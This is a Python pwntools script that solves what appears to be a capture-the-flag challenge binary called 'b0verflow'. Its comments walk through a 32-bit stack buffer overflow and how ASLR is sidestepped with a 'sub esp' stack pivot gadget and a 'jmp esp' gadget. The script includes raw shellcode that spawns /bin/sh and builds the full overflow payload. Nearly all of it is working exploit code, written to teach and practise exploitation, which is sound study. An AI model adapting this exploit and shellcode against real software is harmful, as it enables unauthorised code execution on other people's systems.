import pwn
import struct

# b0verflow is a 32-bit dynamically-linked binary
# ASLR is on. All other mitigations are off

# This is the most basic version of a 32-bit stack pivot style bof
# We put shellcode on the stack and then use stack pivot gadgets and a jmp esp gadget to move execution to our shellcode

# I am pretty sure you could also find a way to do a ret2libc here, but whatever

target = pwn.process('./b0verflow')
# pwn.gdb.attach(target, gdbscript="b *0x804859f")


# The vul() function scans 0x32 bytes of input into a 32 byte buffer
# So we havbe an obvious buffer overflow
# The problem is, there are not enough rop gadgets to do a standard static rop chain
# And, we don't have any leaks, so given that ASLR is on, we cannot determine the stack address where our shellcode will end up

# I think you may be able to do a puts(puts) and then ret2libc, but not the style they were looking for I guess
# Could also just do a brute force ret2libc, given that this is 32-bit

# The solution is a stack pivot!
# ropper --file b0verflow --stack-pivot will show all potential stack pivot gadgets
# 0x08048500: sub esp, 0x24; ret; looks promising
pivot_gadget = struct.pack("<I", 0x08048500)

# So we can move esp. If we wanted to execute a rop chain, we could start it at the location where esp lands and we would be good
# But, we already established that we don't have the rop gadgets for a full rop chain
# We instead want to write shellcode into our buffer and execute that

# Reminder: Whats the difference between jmp esp and ret?
# ret pops the stack, placing the value at the top of the stack into eip
# jmp esp places the address of the top of the stack into eip

# So, if we had shellcode on the top of the stack and did a ret, we would get a sigsev, because the bytes of the shellcode on the top of the stack
# would be popped into rip, and interpreted as an address
# But if we do a jmp esp, the address of the top of the stack is moved into rip, an address which points to the start of our shellcode

# ropper --file b0verflow --search "jmp esp"
jmp_esp = struct.pack("<I", 0x08048504)

# Shellcode to pop a shell. Source is in shellcode.asm
shellcode = b'\x31\xc0\xbb\xd0\x8c\x97\xff\x83\xf3\xff\x53\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80'

# Looking at the stack at the point of the ret from vuln()
# with something like tele -l 12 $esp-0x28

# [ start of 32 byte buffer ]
# [ rbp storage             ]
# [ return address          ] <-- $esp

# Sending a buffer overflow (shellcode, filler, gadgets) we can make that:

# [ 'aaaa'                       ]
# [ address of jmp esp gadget    ]
# [ 28 bytes of shellcode/filler ]
# [ address of pivot gadget      ] <-- $esp
# [ some other thing here        ]

# As we ret, our stack pointer incremented (moved down) by 4 because it is popped into rip
# So now it points to [ some other thing here ]

# our sub esp, 0x24 gadget moves esp to point 4-bytes into our buffer (0x24 = 36), 
# which will contain the address of the jmp esp gadget 
# The stack pivot gadget's ret, then pops that address into rip, moving the stack ptr down to the start of our shellcode
# The jmp instruction then jumps execution to the start of our shellcode

payload = b'aaaa'
payload += jmp_esp
payload += shellcode
payload += b'a' * (28 - len(shellcode))
payload += pivot_gadget

target.sendline(payload)
target.interactive()